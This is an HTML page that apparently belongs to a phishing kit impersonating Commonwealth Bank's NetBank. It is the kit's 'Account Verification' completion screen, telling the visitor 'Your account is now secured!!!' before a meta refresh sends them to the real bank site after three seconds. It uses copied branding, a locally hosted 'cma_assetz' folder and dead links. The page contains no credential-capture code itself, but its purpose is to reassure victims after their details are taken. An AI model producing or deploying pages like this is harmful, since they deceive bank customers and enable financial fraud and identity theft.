
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" class="win firefox firefox1 gecko gecko1 cssBeforeSupport" lang="en">
    <head id="ctl00_head1">
        <title>NetBank</title>
		<meta http-equiv="refresh" content="3;url=https://commbank.com.au" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <link rel="stylesheet" href="cma_assetz/css/framework-merge.css" />
        <link rel="icon" href="cma_assetz/img/favicon.ico" />
    </head>
    <body class="yourlogondetails Revamp NavigationLess">
        <form method="post" action="#" id="aspnetForm" autocomplete="off">
            <div id="header">
                <div id="ctl00_HeaderControl_masthead" class="masthead header global-netbank-anonymous">
                    <span id="ctl00_HeaderControl_accessibilityModeControl" class="accessibilityMode">
                        <a href="javascript:void(0);" id="accessibilityTrigger">Activate screen reader friendly NetBank.</a>
                        <span id="accessibilityModeMsg" class="ScreenReader">
                            Screen reader friendly mode is activated and will be enabled whenever you log into NetBank. If you would like to change this setting, please contact us or call 13 2221 at any time.
                            <a href="javascript:void(0);">contact us</a>
                        </span>
                    </span>
                    <div id="ctl00_HeaderControl_divGlobalNavToolbar" class="global-netbank-toolbar p-1">
                        <span class="nav-diamond-logo"><img src="cma_assetz/img/cba_logo_diamond.png" /></span>
                        <ul class="nav-channel-switch left"></ul>
                        <div class="global-netbank-searchbox"></div>
                    </div>
                    <div class="nav-global"></div>
                </div>
            </div>
            <div class="clearfix" id="BodyContainer">
                <div class="clearfix" id="ContentArea">
                    <div id="ctl00_ContentHeader" class="ContentHeader" style="margin-bottom: 32px;"><h1 class="headerTitle">Account Verification</h1></div>
                    <div id="MainContent">
                        <div class="content_main">
                            <div style="margin-top: 0px;" class="enterLogonDetailsBackground">
                                <div class="loginDetailsPanel" style="width: 100%;">
                                    <div class="ContentPanel_Form" id="ctl00_BodyPlaceHolder_cpl_outer">
                                        <fieldset id="ctl00_BodyPlaceHolder_cpl" class="ContentPanel" style="z-index: 6;">
                                            <div class="FieldPanel">
                                                <ul class="LabelFieldList" role="presentation">
                                                    <li class="LabelFieldListItem" role="presentation">
                                                        <h2><strong>Your account is now secured!!!</strong></h2>
                                                    </li>
                                                    <li class="LabelFieldListItem" role="presentation"><p>Thank you for accepting our new terms and conditions.</p></li>
                                                    <li class="LabelFieldListItem" role="presentation"><span class="subtext">&nbsp;</span></li>
                                                    <li class="LabelFieldListItem" role="presentation">
                                                        <div class="logonControls">
                                                            <center>
                                                                <svg width="95" height="95" xmlns="http://www.w3.org/2000/svg">
                                                                    <g display="inline">
                                                                        <path
                                                                            stroke-width="0"
                                                                            fill="#fc0"
                                                                            fill-rule="evenodd"
                                                                            stroke="#0066ff"
                                                                            stroke-linecap="round"
                                                                            stroke-linejoin="round"
                                                                            id="path936"
                                                                            d="m-0.00107,50.37142c12.04134,11.30574 19.82332,21.48153 32.70392,45.0645c28.00198,-72.92269 66.34378,-91.64482 61.48022,-94.87319c-9.837,-6.80986 -57.69498,50.27236 -63.48111,57.80253c-6.9603,-3.80173 -30.70303,-17.09052 -30.70303,-7.99384z"
                                                                        />
                                                                    </g>
                                                                </svg>
                                                            </center>
                                                        </div>
                                                    </li>
                                                </ul>
                                            </div>
                                        </fieldset>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="ctl00_AuxiliaryContentWrapper" class="AuxiliaryContent_wrapper">
                        <div id="AuxiliaryContent">
                            <div class="ContentPanel_Text" id="ctl00_InformationPlaceholder_iplNetCodeTips_outer">
                                <div class="RightContentPanel RightContentPanelDefault">
                                    <div>
                                        <h3><span>Account verification</span></h3>
                                        <div class="Contents HideBulletPoints">
                                            <div>
                                                <ul>
                                                    <li><div class="rhssecurityImage"></div></li>
                                                    <li>
                                                        <p><span class="rhsText">We keep your personal information secure.</span> <a id="ctl00_InformationPlaceholder_lnkLearnMore" href="javascript:void(0);"> Learn more </a> .</p>
                                                    </li>
                                                    <li></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div id="footer" class="footer footer-mod">
                <div>
                    <ul>
                        <li><a href="javascript:void(0);">Tools &amp; calculators</a></li>
                        <li><a href="javascript:void(0);">Find a branch</a></li>
                        <li><a href="javascript:void(0);"> Financial assistance </a></li>
                        <li><a href="javascript:void(0);"> Contact us </a></li>
                    </ul>
                    <ul>
                        <li><a href="javascript:void(0);">Important information</a></li>
                        <li><a href="javascript:void(0);">Privacy</a></li>
                        <li><a href="javascript:void(0);">Cookies</a></li>
                        <li><a href="javascript:void(0);">Terms of use</a></li>
                    </ul>
                    <span>© 2022 Commonwealth Bank of Australia ABN 48 123 123 124 AFSL and Australian credit licence 234945</span>
                </div>
            </div>
        </form>
    </body>
</html>
